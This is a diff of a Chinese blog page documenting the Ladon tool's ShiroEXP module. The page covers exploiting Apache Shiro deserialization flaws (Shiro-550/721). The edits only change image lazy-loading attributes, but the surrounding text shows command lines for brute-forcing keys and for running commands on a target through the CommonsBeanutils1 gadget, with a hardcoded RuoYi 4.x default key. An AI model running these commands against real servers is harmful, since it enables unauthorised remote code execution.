@@ -76,7 +76,7 @@ Ladon ShiroEXP 高效爆破Key Shiro反序列化漏洞复现
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -230,20 +230,20 @@ CommonsCollectionsK1</p>
 <p>内置1000+默认Key，多线程一键爆破(自动AES、GCM加密)，几秒验证<br>
 支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 check</span><br><span class="line">Ladon ShiroKey http://192.168.1.8</span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/key.png"></p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/key2.png"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/shiro/key.png"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/shiro/key2.png"></p>
 <h3 id="爆破利用链">爆破利用链</h3>
 <p>内置1000+默认Key，多线程一键爆破(自动AES-CBC、AES-GCM加密)，几秒验证</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc check</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm check</span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/gadget.png"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/shiro/gadget.png"></p>
 <h3 id="ShiroEXP-漏洞利用">ShiroEXP 漏洞利用</h3>
 <p>使用爆破出来的对应利用链，无回显执行命令</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/exp.png"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/shiro/exp.png"></p>
 <h3 id="Rouyi-4-x漏洞利用">Rouyi 4.x漏洞利用</h3>
 <p>Rouyi4Exp只针对4.X默认Key(zSyK5Kp6PZAAjlT+eeNMlg==)，利用链CommonsBeanutils1的一键利用。对于其它版本，最好还是使用ShiroExp模块，这个针对所有使用Shiro框架的CMS</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Rouyi4Exp http://192.168.1.8 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 <span class="built_in">whoami</span></span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 <span class="built_in">whoami</span></span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p>
 <h3 id="执行自定义payload">执行自定义payload</h3>
 <h4 id="ysoserial生成payload">ysoserial生成payload</h4>
 <p>Shiro利用链CommonsBeanutils1，所以payload必须使用CommonsBeanutils1封装，并不是任意class都能执行，要不然还爆破利用链的干嘛？因为目标引用了这个库，才能反序列化执行命令，并不是单纯知道KEY，就能执行。</p>
@@ -287,7 +287,7 @@ CommonsCollectionsK1</p>
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
